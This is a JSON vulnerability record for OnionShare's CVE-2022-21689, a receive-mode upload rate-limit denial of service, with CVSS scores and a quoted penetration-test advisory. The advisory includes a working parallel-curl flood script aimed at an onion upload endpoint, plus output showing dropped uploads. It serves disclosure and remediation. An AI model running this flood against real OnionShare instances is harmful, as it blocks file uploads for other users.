{
    "name": "onionshare-cli",
    "cve_id": "CVE-2022-21689",
    "publish_date": "2022-01-18T22:15Z",
    "cwe_id": "CWE-400",
    "owner": "Micah Lee",
    "affected_versions": [
        {
            "version_value": "2.5",
            "operator": "<"
        }
    ],
    "references": [
        "https://github.com/onionshare/onionshare/security/advisories/GHSA-jh82-c5jw-pxpc",
        "https://github.com/onionshare/onionshare/releases/tag/v2.5",
        "https://nvd.nist.gov/vuln/detail/CVE-2022-21689",
        "https://github.com/advisories/GHSA-jh82-c5jw-pxpc"
    ],
    "description": "From NVD:\nOnionShare is an open source tool that lets you securely and anonymously share files, host websites, and chat with friends using the Tor network. In affected versions the receive mode limits concurrent uploads to 100 per second and blocks other uploads in the same second, which can be triggered by a simple script. An adversary with access to the receive mode can block file upload for others. There is no way to block this attack in public mode due to the anonymity properties of the tor network.\nFrom Github:\nBetween September 26, 2021 and October 8, 2021, [Radically Open Security](https://www.radicallyopensecurity.com/) conducted a penetration test of OnionShare 2.4, funded by the Open Technology Fund's [Red Team lab](https://www.opentech.fund/labs/red-team-lab/).\n\n- Vulnerability ID: OTF-012\n- Vulnerability type: Denial of Service\n- Threat level: Moderate\n\n## Description:\n\nThe receive mode limits concurrent uploads to 100 per second and blocks other uploads in the same second, which can be triggered by a simple script.\n\n## Technical description:\n\nThe following script uses GNU parallel and curl with around 6000 requests in parallel to send 10000 requests. A change in the `ulimit -n` configuration is required for it to work. This is sufficient to block file upload on a (public) receive instance.\n\n```\nseq 10000 | parallel --max-args 0 --jobs 6000 \"curl -i -s -x socks5h://localhost:9150 -k -X $'POST' -H $'Host: csqrp3qciewvj5axph4o62jnr6aevhmpxfkydmi3256bprhbusr2ltid.onion' -H $'Accept-Encoding: gzip, deflate' -H $'Content-Type: multipart/form-data; boundary=---------------------------19182376703918074873375387042' -H $'Content-Length: 329' -H $'Connection: close' --data-binary $'-----------------------------19182376703918074873375387042\\x0d\\x0aContent-Disposition: form-data; name=\\\"file[]\\\"; filename=\\\"poc.txt\\\"\\x0d\\x0aContent-Type: text/plain\\x0d\\x0a\\x0d\\x0aA\\x0d\\x0a-----------------------------19182376703918074873375387042\\x0d\\x0aContent-Disposition: form-data; name=\\\"text\\\"\\x0d\\x0a\\x0d\\x0a\\x0d\\x0a-----------------------------19182376703918074873375387042--\\x0d\\x0a' $'http://csqrp3qciewvj5axph4o62jnr6aevhmpxfkydmi3256bprhbusr2ltid.onion/upload-ajax'\"\n```\n\nAttack duration was around 80 seconds.\n\nCases where over 99 requests were sent per second:\n\n```\nEvery 0.1s: ls | grep...   onionvm: Tue Oct 5 12:17:00 2021\n78\n```\n\nCases where files were successfully written to disk:\n\n```\nEvery 0.1s: ls | wc -w   onionvm: Tue Oct 5 12:17:00 2021\n8399\n```\n\nThis means that during the attack time 1601 requests of 10000 were dropped. We tried to upload multiple files in the web interface during the attack and were not successful.\n\nThe failsafe is used to prevent creating more than 100 directories per second:\n\nhttps://github.com/onionshare/onionshare/blob/d08d5f0f32f755f504494d80794886f346fbafdb/cli/onionshare_cli/web/receive_mode.py#L386-L427\n\nThe limit of 100 requests/second is significantly lower than the possible network bandwidth and greatly reduces the attack complexity for denial of service. Our test was conducted over the tor network, which showed no limitation for the required bandwidth.\n\n## Impact:\n\nAn adversary with access to the receive mode can block file upload for others. There is no way to block this attack in public mode due to the anonymity properties of the tor network.\n\n## Recommendation:\n\n- Remove this limitation, or\n- Derive directory name from milliseconds\n",
    "latest_version": "2.5",
    "language": "python",
    "license": "GPL-3.0-or-later",
    "repository_summary": "OnionShare lets you securely and anonymously send and receive files. It works by starting a web server, making it accessible as a Tor onion service, and generating an unguessable web address so others can download files from you, or upload files to you. It does _not_ require setting up a separate server or using a third party file-sharing service.",
    "repo_url": "https://github.com/onionshare/onionshare",
    "impact": {
        "cvss2_score": null,
        "cvss2_severity": null,
        "av": "NETWORK",
        "ac": "LOW",
        "pr": "NONE",
        "c": "NONE",
        "i": "NONE",
        "a": "HIGH",
        "impact_score": 3.6,
        "exploitability_score": 3.9,
        "cvss3_score": 7.5,
        "cvss3_severity": "HIGH",
        "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
        "ui": "NONE",
        "s": "UNCHANGED"
    },
    "ochrona_severity_score": 7.5
}